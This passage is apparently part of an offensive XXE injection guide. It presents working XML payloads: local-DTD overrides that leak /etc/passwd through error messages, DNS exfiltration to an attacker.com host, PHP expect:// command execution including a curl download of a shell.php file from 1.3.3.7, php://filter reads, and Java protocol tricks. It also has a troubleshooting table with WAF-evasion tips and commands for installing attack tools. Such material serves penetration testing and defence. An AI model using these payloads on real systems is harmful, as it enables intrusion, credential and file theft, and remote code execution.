  Note that the entity value **must** be delimited by single quotes. The exfiltration declarations inside the value use double quotes (`SYSTEM "..."`) — using double quotes as the outer delimiter would cause the parser to close the entity value at the first `"` it encounters inside the payload. The single quote `'` that ends the payload closes the entity value opened at the start of the `%ISOamso` declaration.

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<message></message>
```

**Explanation:**

1. `%ISOamso;` is normally expanded at root level in `docbookx.dtd` to load a character entity set. We redefine it to inject the exfiltration chain instead.
2. Because the injection happens at root level, the three-phase chain — `%file`, `%eval`, `%error` — lands directly in the DTD body as independent declarations. No declaration needs breaking open and no remainder needs absorbing.
3. `%eval;` produces the declaration of `%error`, and `%error;` triggers the URI resolution error that leaks the file contents — identical to the `fonts.dtd` case.

- **Step 3:** Trigger Error-Based Exfiltration:
  If the application returns error messages, the response will include something like:

```
errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"
```

-----

### Requirements for Robust Payloads

Creating a working payload for local DTD-based XXE exploitation requires careful attention to XML and DTD parsing rules. Below are the key requirements:

1. **Valid DTD Structure**

- The injected payload must maintain a syntactically valid DTD.
- All markup declarations (`<!ELEMENT>`, `<!ENTITY>`) must appear in a proper order.
- For declaration-embedded injection points, use structural padding (e.g., `<!ELEMENT aa (bb'>`) to absorb the remainder of the broken declaration and prevent parser errors. Root-level injection points do not require padding.

2. **Correct Entity Nesting and Escaping**

- Nested entity declarations inside another entity must be properly escaped:
  - Use `&#x25;` for `%`, `&#x26;` for `&` and `&#x27;` for quotes.
  - **Example**:
    
    ```xml
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///path/%file;'>">
    ```
  - Failure to escape these characters often results in **markup declaration errors**.

3. **Order of Expansion**

- Override entities must be declared before `%local_dtd;` is expanded — the internal subset is processed first, so any overrides must be in place before the external DTD is loaded.
- Once `%local_dtd;` is expanded, the parser reaches the first relevant use site of the overridden entity and injects the exfiltration chain into the DTD. Within that injected text, `%eval;` is expanded inline — its expansion produces the declaration of `%error`. Immediately after, `%error;` is expanded, triggering the URI resolution that leaks the file contents.
- The entire chain executes automatically as part of `%local_dtd;` processing. Explicitly expanding `%eval;` or `%error;` in the internal subset is neither possible nor necessary — and attempting to do so would cause the parser to reject the payload due to the parameter entity chaining restriction in the internal subset.

4. **Include Structural Padding for Declaration-Embedded Injection Points**

- When the overridden entity is referenced inside a markup declaration (like `<!ELEMENT>` or `<!ATTLIST>`), add a padding declaration to absorb the remainder of the broken declaration:

```xml
  <!ELEMENT aa (bb'>
```

- The exact form of the padding depends on the target DTD. Refer to [Dissecting the Structural Padding](#dissecting-the-structural-padding) for the derivation process.
- Root-level injection points do not require padding.

5. **Use Single Quotes as Entity Value Delimiters**

- The exfiltration declarations inside the entity value use double quotes (`SYSTEM "..."`). The outer entity value delimiter must therefore be single quotes to avoid the parser closing the entity value prematurely at the first `"` it encounters. This applies to both injection types.

6. **Use Parameter Entities for Injection**

- Always use **parameter entities** (`%`) for overriding and chaining.

7. **Error-Based Exfiltration Logic**

- Reference a non-existent file concatenated with the target file content.
- Example:

```xml
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
```

8. **Compatibility with Target DTD**

- The chosen local DTD must allow parameter entity overrides.
- Common candidates with declaration-embedded injection points: `fonts.dtd` (`%expr;`), `jspxml.dtd` (`%Body;`)
- Common candidates with root-level injection points: `docbookx.dtd` (`%ISOamso;` and other ISO entity sets)

### Why This Technique Works

The W3C XML specification forbids parameter entity chaining within the internal DTD subset — this is the restriction that makes the basic error-based payload unreliable in spec-compliant parsers, as explained in the [Error-Based Blind XXE](#error-based-blind-xxe) section.

This technique sidesteps that restriction entirely. Rather than chaining parameter entities inside the internal subset, we use the internal subset only to **redefine** an entity that already exists in the local DTD. Because entity declarations follow a first-definition-wins rule, our override takes effect before the original declaration in the DTD is reached.

When `%local_dtd;` is then expanded, execution moves into the external DTD context — where parameter entity chaining is explicitly permitted by the spec. The malicious logic embedded inside the overridden entity executes there, not in the internal subset, which is why spec-compliant parsers do not reject it. This holds true for both injection types — the type determines the payload structure, not the underlying mechanism.

## DNS-Based OOB Exfiltration

When HTTP/HTTPS connections are blocked by firewall rules, DNS exfiltration provides an alternative. DNS traffic is rarely fully blocked so even if the HTTP request never reaches us, the DNS query still happens when the parser tries to resolve the domain:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfiltrate;
```

Services like **Interactsh** provide automatic DNS logging:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.interactsh-domain.com/'>">
%eval;
%exfiltrate;
```

There are two important limitations to keep in mind. First, DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. Second — and this is easy to overlook — DNS labels only accept alphanumeric characters (a-z, 0-9) and hyphens. Characters like `:`, `/`, newlines and spaces will break the query. Since files like `/etc/passwd` are full of these characters, the payloads above will only work as-is for files with very simple content (like `/etc/hostname` which is typically a single word).

To exfiltrate anything meaningful we need to encode the data before embedding it in the subdomain. Base32 is the safest option because its output only contains A-Z and 2-7 — all valid DNS characters. Base64 works in some contexts but its output includes `+`, `/` and `=` which are also invalid in labels. In PHP environments we can combine `php://filter/convert.base64-encode` with the exfiltration payload to get clean ASCII before it hits the DNS query. For files longer than 63 characters, split the encoded data into chunks across multiple labels or multiple queries.

## PHP Wrappers

PHP's XML functions support protocol wrappers that extend XXE capabilities beyond simple file inclusion. These only work on PHP-based targets.

### expect:// Wrapper (Environment-Specific RCE)

The `expect://` wrapper executes system commands through PHP. This is one of the few paths from XXE to RCE but it requires the PHP `expect` extension to be installed and enabled which is disabled by default in modern PHP. In practice this is rare but when present the impact is critical:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

More examples:

```xml
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://whoami">
```

**⚠️ Character restrictions in expect:// URIs.** There is a catch when running commands with arguments: PHP's XML parser treats the `expect://` URI literally and rejects it if it contains spaces, `>`, `&` or other special characters. A payload like `expect://cat /etc/passwd` will fail with an "Invalid URI" error. URL encoding (`%20`, `+`) does not help — the parser does not decode it. XML character references (`&#x20;`) do not work either.

The workaround is to replace spaces with `$IFS` — the shell Internal Field Separator variable. When the next argument starts with letters, wrap it in single quotes so the shell does not try to read it as part of the variable name:

```xml
<!-- cat /etc/passwd → replace spaces with $IFS -->
<!ENTITY xxe SYSTEM "expect://cat$IFS/etc/passwd">

<!-- curl -O http://1.3.3.7/shell.php → $IFS + quotes for args -->
<!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7/shell.php'">
```

For complex commands like reverse shells it is easier to use `expect://` to download a script first and then execute it in a second request, rather than cramming the whole command into a single URI.

`expect://` requires the PHP `expect` extension which as mentioned is rarely present in production environments.

### php://filter Wrapper (Base64 Encoding)

The `php://filter` wrapper reads files with encoding filters. Useful for files that contain characters that would break XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Output:

```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo...
```

Filters can be chained for WAF bypass:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode|convert.base64-encode/resource=file:///etc/passwd">
```

Other available filters:

```xml
<!ENTITY xxe SYSTEM "php://filter/string.strip_tags/resource=file:///var/www/html/index.php">
<!ENTITY xxe SYSTEM "php://filter/string.toupper/resource=file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.quoted-printable-encode/resource=file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/string.rot13/resource=file:///etc/passwd">
```

### data:// and zip:// Wrappers

`data://` allows embedding data directly, useful for bypassing URL-based filters:

```xml
<!ENTITY xxe SYSTEM "data://text/plain,malicious content">
```

`zip://` reads files from ZIP archives without extraction. Useful for attacking uploaded XLSX/DOCX:

```xml
<!ENTITY xxe SYSTEM "zip:///path/to/archive.zip#filename.xml">
```

## Java Protocol Exploitation

Java's XML parsers support additional protocols. These only apply when the target runs Java.

### jar:// Protocol (Environment-Specific Escalation)

Accesses files within Java archives. In very specific scenarios where the application loads external JARs and deserialization gadgets are available in the classpath, this could potentially be chained into RCE. This is a rare condition but worth testing in Java environments:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:file:///path/to/application.jar!/path/to/resource">
]>
<foo>&xxe;</foo>
```

### netdoc:// Protocol

Some Java implementations support `netdoc://`:

```xml
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### LDAP and RMI

In Java environments, `ldap://` and `rmi://` URIs in entity declarations can trigger JNDI (Java Naming and Directory Interface) lookups. It is worth noting that in most cases it is not the XML parser itself that resolves these protocols directly — the resolution is delegated to JNDI, which then performs the actual LDAP or RMI lookup. This is an important distinction because it means the attack depends on the JNDI configuration and Java version, not just the XML parser settings.

LDAP example:

```xml
<!ENTITY xxe SYSTEM "ldap://ldap.example.com/cn=users,dc=example,dc=com?objectClass?sub">
```

RMI example:

```xml
<!ENTITY xxe SYSTEM "rmi://internal-server:1099/object_name">
```

-----

# Troubleshooting Guide

|Symptom                           |Likely Cause                    |Solution                                           |
|----------------------------------|--------------------------------|---------------------------------------------------|
|"Malformed XML" error             |XML syntax error in payload     |Validate payload syntax; use XML validators        |
|"Unknown protocol: X"             |Typo in protocol name           |Use valid protocols: `file://`, `http://`, `ftp://`|
|No entity expansion in output     |Entity expansion disabled       |Try XInclude or wrapper techniques                 |
|No callback received from OOB     |Firewall blocking outbound      |Use DNS-based OOB; test from DMZ if possible       |
|File contents show only first line|Binary/special characters or file contains several lines       |Use error-based or OOB exfiltration; use php://filter for encoding|
|DOCTYPE not allowed error         |DOCTYPE explicitly disabled     |Use XInclude or file upload techniques             |
|Entity limit exceeded             |Billion Laughs protection active|Use single entity; avoid recursive expansion       |
|403/500 on OOB callback           |WAF blocking the request        |Obfuscate URL; use different protocols             |
|Parameter entities not expanding  |Parser doesn't support them     |Use general entities; try XInclude                 |
|"Connection refused" on SSRF      |Target port not open            |Verify port; check firewall                        |
|Base64 decoding shows garbage     |Filter chain incorrect          |Test php://filter chains individually              |
|No error message feedback         |Application suppresses errors   |Use blind XXE with OOB exfiltration                |

-----

# Tools and Resources

## Security Testing Tools

|Tool                       |Purpose                                 |Usage                                              |
|---------------------------|----------------------------------------|---------------------------------------------------|
|**XXEinjector**            |Automated XXE payload generation        |`ruby xxeinjector.rb --host=<our IP> --path=/etc --file=<file with requests>`    |
|**oxml_xxe**               |XXE in Office documents (DOCX, XLSX)    |`ruby server.rb`              |
|**Burp Suite Collaborator**|OOB XXE detection and exfiltration      |Built-in to Burp Suite Pro                         |
|**Interactsh**             |Free OOB interaction logging (DNS, HTTP)|`./interactsh-client`                              |
|**PayloadsAllTheThings**   |XXE payload repository                  |https://github.com/swisskyrepo/PayloadsAllTheThings|
|**CyberChef**              |Payload encoding/transformation         |https://cyberchef.io/                              |

### [XXEinjector](https://github.com/enjoiz/xxeinjector)

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt
```

### [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)

```bash
apt-get install -y make git libsqlite3-dev libxslt-dev libxml2-dev zlib1g-dev gcc ruby3.2 g++
gem install bundler
bundle install
ruby server.rb
```

### [Interactsh](https://github.com/projectdiscovery/interactsh)

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# Use the generated domain in XXE payloads: http://<YOUR_INTERACTSH_DOMAIN>/?data=%file;
```

-----

# References

## OWASP

- [A05:2021 – Security Misconfiguration (includes XXE)](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

## PortSwigger Web Security Academy

- [XML External entity injection](https://portswigger.net/web-security/xxe)
- [XML External entity injection - Blind](https://portswigger.net/web-security/xxe/blind)

## Community

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [Hacktricks XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)


## Papers

- [DTD Security Considerations - W3C XML Specifications](https://www.w3.org/XML/1998/06/xmlspec-report-v20.htm)
